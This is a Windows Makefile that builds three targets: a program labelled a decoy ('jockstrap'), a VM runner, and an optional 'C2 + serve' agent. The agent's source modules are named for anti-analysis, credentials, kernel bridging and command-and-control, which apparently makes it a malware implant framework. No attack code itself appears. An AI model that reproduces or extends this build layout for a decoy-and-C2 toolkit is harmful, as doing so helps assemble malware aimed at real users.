CC = cl
CFLAGS = /nologo /W3 /O2 /D_CRT_SECURE_NO_WARNINGS /D_WIN32_WINNT=0x0601
CFLAGS += /Iinclude /Iplatform /Ikmod
LDFLAGS = /nologo kernel32.lib advapi32.lib ws2_32.lib version.lib

BUILDDIR = obj
OUTDIR = out

# ── primary target: jockstrap (decoy) ─────────────────────────────────────
STRAP_SRCS = src\jockstrap.c
STRAP_OBJS = $(patsubst %.c,$(BUILDDIR)\%.obj,$(notdir $(STRAP_SRCS)))

STRAP = $(OUTDIR)\jockstrap.exe

# ── secondary target: runner (VM engine) ──────────────────────────────────
RUNNER_SRCS = src\jockey_runner.c src\vm.c src\loader.c src\value.c
RUNNER_OBJS = $(patsubst %.c,$(BUILDDIR)\%.obj,$(notdir $(RUNNER_SRCS)))

RUNNER = $(OUTDIR)\jockey_runner.exe

# ── optional: full agent (C2 + serve) ─────────────────────────────────────
AGENT_SRCS = src\main.c src\vm.c src\loader.c src\agent.c src\agent_c2.c \
             src\builtins.c src\value.c src\kernel_bridge.c
AGENT_SRCS += src\builtins\anti.c src\builtins\system.c src\builtins\fs.c
AGENT_SRCS += src\builtins\process.c src\builtins\memory.c src\builtins\net.c
AGENT_SRCS += src\builtins\cred.c src\builtins\kernel.c src\builtins\util.c
AGENT_SRCS += src\builtins\pure.c src\builtins\crypto.c src\builtins\data.c
AGENT_SRCS += src\platform\windows\platform.c
AGENT_OBJS = $(patsubst %.c,$(BUILDDIR)\%.obj,$(notdir $(AGENT_SRCS)))

AGENT = $(OUTDIR)\jockey_agent.exe

all: $(BUILDDIR) $(OUTDIR) $(STRAP) $(RUNNER)

$(STRAP): $(STRAP_OBJS) src\jockstrap.rc
	$(CC) $(LDFLAGS) /Fe$(STRAP) $(STRAP_OBJS) src\jockstrap.res

$(RUNNER): $(RUNNER_OBJS)
	$(CC) $(LDFLAGS) /Fe$(RUNNER) $(RUNNER_OBJS)

$(AGENT): $(AGENT_OBJS)
	$(CC) $(LDFLAGS) /Fe$(AGENT) $(AGENT_OBJS)

$(BUILDDIR):
	if not exist $(BUILDDIR) mkdir $(BUILDDIR)

$(OUTDIR):
	if not exist $(OUTDIR) mkdir $(OUTDIR)

$(BUILDDIR)\%.obj: src\jockstrap.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\jockey_runner.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\main.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\vm.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\loader.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\value.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\kernel_bridge.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\agent.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\agent_c2.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\anti.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\system.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\fs.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\process.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\memory.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\net.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\cred.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\kernel.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\util.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\pure.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\crypto.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\builtins\data.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

$(BUILDDIR)\%.obj: src\platform\windows\platform.c
	$(CC) $(CFLAGS) /c /Fo$@ $<

src\jockstrap.res: src\jockstrap.rc
	rc.exe /fo $@ $<

clean:
	del /Q $(STRAP) $(RUNNER) $(AGENT)
	del /Q /S $(BUILDDIR)\*.obj
	del /Q src\jockstrap.res
	rmdir /Q $(BUILDDIR)
	rmdir /Q $(OUTDIR)

.PHONY: all clean
